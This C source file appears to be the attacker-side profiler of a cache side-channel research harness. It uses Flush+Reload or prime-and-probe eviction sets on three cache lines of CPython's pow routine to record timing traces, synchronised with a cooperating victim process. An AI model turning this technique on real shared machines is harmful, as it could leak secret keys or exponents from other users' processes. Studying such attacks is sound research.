#include "cpython_pow.h"

#include "cache/evset.h"
#include "prime_probe.h"
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "shared_memory.h"

#define CACHE_LINE_COUNT (3)
#define PROFILE_ITERATIONS (1 << 16)

#define USE_FF (0)
#define USE_PS (1)

CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE);
sync_ctx_t sync_ctx;
uint64_t victim_iteration = 4;

#if USE_FF
static const uint64_t waiting_time = 80000;

uint64_t sample_tsc[PROFILE_ITERATIONS][CACHE_LINE_COUNT];
uint64_t reload_time[PROFILE_ITERATIONS][CACHE_LINE_COUNT];

void FF_profile_pow() {
	init_sync_ctx(CPYTHON_PROJ_ID);

	log_info("Wait for victim initialization");

	pthread_barrier_wait(sync_ctx.barrier);

	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET)

	create_directory("output");

	for (int i = 0; i < victim_iteration; ++i) {
		log_info("Attacker Iteration %d", i);
		char output_file[32];
		sprintf(output_file, "output/%d.out", i);
		FILE *fp = fopen(output_file, "w");
		if (fp == NULL) {
			log_error("Error opening output_file %s", output_file);
			exit(1);
		}

		int index = 0;
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier);

		while (index < PROFILE_ITERATIONS) {
			FLUSH_CACHE_LINE(consume_zero, 2);
			FLUSH_CACHE_LINE(absorb_window, 2);
			FLUSH_CACHE_LINE(absorb_trailing, 2);

			FR_wait(waiting_time);

			RELOAD_CACHE_LINE(consume_zero, 2, 0);
			RELOAD_CACHE_LINE(absorb_window, 2, 1);
			RELOAD_CACHE_LINE(absorb_trailing, 2, 2);

			++index;
		}

		if (sync_ctx_get_action() == SYNC_CTX_START) {
			log_warn("Insufficient profiler iterations");
		}

		pthread_barrier_wait(sync_ctx.barrier);

		for (int p = 0; p < index; ++p) {
			for (int c = 0; c < CACHE_LINE_COUNT; ++c) {
				fprintf(fp, "%lu:%lu ", sample_tsc[p][c], reload_time[p][c]);
			}
			fprintf(fp, "\n");
		}
		fclose(fp);

		memset(sample_tsc,
		       0,
		       PROFILE_ITERATIONS * CACHE_LINE_COUNT * sizeof(uint64_t));
		memset(reload_time,
		       0,
		       PROFILE_ITERATIONS * CACHE_LINE_COUNT * sizeof(uint64_t));
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

#elif USE_PS

enum { cache_line_count = 3, profile_samples = 1 << 15 };
static uint64_t victim_runs = 1;
static const uint64_t max_exec_cycles = (uint64_t)3e9;
static uint64_t probe_time_arr[cache_line_count][profile_samples];
static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];
static pthread_barrier_t attacker_threads_barrier;
static const char *test_name = "cpython_pow";

void PS_profile_pow() {
	PS_attacker_thread_config_t pt_consume_zero, pt_absorb_window,
	    pt_absorb_trailing;
	helper_thread_ctrl hctrl;

	init_sync_ctx(CPYTHON_PROJ_ID);
	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET);

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");
		return;
	}

	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper!\n");
		return;
	}

	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	PS_thread_config_init(pt_consume_zero);
	pt_consume_zero.label = "consume_zero";
	pt_consume_zero.slot = 0;
	pt_consume_zero.pin_cpu = -1;
	pt_consume_zero.target =
	    (uint8_t *)((uintptr_t)target_consume_zero + 3 * CACHE_LINE_SIZE);
	pt_consume_zero.evset = prepare_evset(pt_consume_zero.target, &hctrl);

	PS_thread_config_init(pt_absorb_window);
	pt_absorb_window.label = "absorb_window";
	pt_absorb_window.slot = 1;
	pt_absorb_window.pin_cpu = -1;
	pt_absorb_window.target =
	    (uint8_t *)((uintptr_t)target_absorb_window + 2 * CACHE_LINE_SIZE);
	pt_absorb_window.evset = prepare_evset(pt_absorb_window.target, &hctrl);

	PS_thread_config_init(pt_absorb_trailing);
	pt_absorb_trailing.label = "absorb_trailing";
	pt_absorb_trailing.slot = 2;
	pt_absorb_trailing.pin_cpu = -1;
	pt_absorb_trailing.target =
	    (uint8_t *)((uintptr_t)target_absorb_trailing + 2 * CACHE_LINE_SIZE);
	pt_absorb_trailing.evset =
	    prepare_evset(pt_absorb_trailing.target, &hctrl);

	stop_helper_thread(&hctrl);

	if (pthread_barrier_init(&attacker_threads_barrier, NULL, 3) != 0) {
		log_error("Error initializing barrier\n");
		return;
	}

	pthread_barrier_wait(sync_ctx.barrier);

	pthread_t thread0 = 0, thread1 = 0, thread2 = 0;
	pthread_create(&thread0, NULL, PS_attacker_thread, &pt_consume_zero);
	pthread_create(&thread1, NULL, PS_attacker_thread, &pt_absorb_window);
	pthread_create(&thread2, NULL, PS_attacker_thread, &pt_absorb_trailing);

	pthread_join(thread0, NULL);
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}
#endif

int main(int argc, char **argv) {
	/* pin_cpu(pinned_cpu0); */

	if (argc > 1) {
		char *endptr = NULL;
		errno = 0;
		const uint64_t value = strtoull(argv[1], &endptr, 10);
		if (errno == 0 && endptr != argv[1] && *endptr == '\0') {
			victim_iteration = value;
		}
	}

	if (victim_iteration == 0) {
		log_error("python iterations has to be non-zero");
		exit(1);
	}
#if USE_FF
	FF_profile_pow();
#elif USE_PS
	PS_profile_pow();
#endif
	return 0;
}
